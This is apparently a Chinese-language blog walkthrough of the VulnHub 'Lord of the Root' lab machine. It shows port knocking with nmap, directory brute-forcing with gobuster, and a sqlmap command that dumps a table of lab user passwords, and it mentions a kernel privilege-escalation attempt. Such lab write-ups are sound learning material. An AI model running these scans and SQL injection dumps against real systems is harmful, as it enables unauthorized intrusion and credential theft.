---
layout: post
title:  "Lord of the root"
description: walkthrough
category: vulnhub
---
# Lord of the root

![image-20200618034235354]({{ site.url }}/assets/Lord_of_the_root.assets/image-20200618034235354.png)

![image-20200618034302713]({{ site.url }}/assets/Lord_of_the_root.assets/image-20200618034302713.png)

查看了漏洞利用文件，需要拥有凭证。

登录ssh看看

![image-20200618034641444]({{ site.url }}/assets/Lord_of_the_root.assets/image-20200618034641444.png)

需要敲端口

敲端口相关阅读

> port-knock技巧
>
> https://www.endpoint.com/blog/2009/11/16/port-knocking-with-knockd
>
>  有一种绕过它的方法。通过在一组预先指定的关闭端口上生成连接尝试，打开端口的方法是打开防火墙上的端口。 一旦收到正确的连接尝试序列，防火墙将打开以前关闭的端口。
>
> https://www.exploit-db.com/exploits/28718
>
> https://blog.rapid7.com/2017/10/04/how-to-secure-ssh-server-using-port-knocking-on-ubuntu-linux/ 

```bash
nmap -Pn --host-timeout 100 --max-retries 0 -p 1 10.10.10.133
nmap -Pn --host-timeout 100 --max-retries 0 -p 2 10.10.10.133
nmap -Pn --host-timeout 100 --max-retries 0 -p 3 10.10.10.133
```



![image-20200618035109052]({{ site.url }}/assets/Lord_of_the_root.assets/image-20200618035109052.png)

1337开了

![image-20200618035346345]({{ site.url }}/assets/Lord_of_the_root.assets/image-20200618035346345.png)

![image-20200618035428938]({{ site.url }}/assets/Lord_of_the_root.assets/image-20200618035428938.png)

![image-20200618035832036]({{ site.url }}/assets/Lord_of_the_root.assets/image-20200618035832036.png)

又是开局一张图

![image-20200618035654402]({{ site.url }}/assets/Lord_of_the_root.assets/image-20200618035654402.png)

这个本地ip可能需要留意一下

打目录

```bash
gobuster -u http://10.10.10.133:1337/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt dir -s '200,204,301,302,307,401,403' -k -e -l -x php,txt,apsx,asp,html -t 10
```

![image-20200618041448264]({{ site.url }}/assets/Lord_of_the_root.assets/image-20200618041448264.png)

![image-20200618041514208]({{ site.url }}/assets/Lord_of_the_root.assets/image-20200618041514208.png)

```bash
THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh
```

![image-20200618041740499]({{ site.url }}/assets/Lord_of_the_root.assets/image-20200618041740499.png)

```bash
/978345210/index.php
```

![image-20200618041832820]({{ site.url }}/assets/Lord_of_the_root.assets/image-20200618041832820.png)

抓包存储为login.txt

```bash
sqlmap -r login.txt --batch --dump
```

![image-20200618213029466]({{ site.url }}/assets/Lord_of_the_root.assets/image-20200618213029466.png)

```bash
+------+----------+------------------+
| id   | username | password         |
+------+----------+------------------+
| 1    | frodo    | iwilltakethering |
| 2    | smeagol  | MyPreciousR00t   |
| 3    | aragorn  | AndMySword       |
| 4    | legolas  | AndMyBow         |
| 5    | gimli    | AndMyAxe         |
+------+----------+------------------+
```







![image-20200618210446764]({{ site.url }}/assets/Lord_of_the_root.assets/image-20200618210446764.png)

其他常规枚举并没有发现什么有用的，尝试内核提权

![image-20200618212045518]({{ site.url }}/assets/Lord_of_the_root.assets/image-20200618212045518.png)



![image-20200618213557693]({{ site.url }}/assets/Lord_of_the_root.assets/image-20200618213557693.png)

![image-20200618213732516]({{ site.url }}/assets/Lord_of_the_root.assets/image-20200618213732516.png)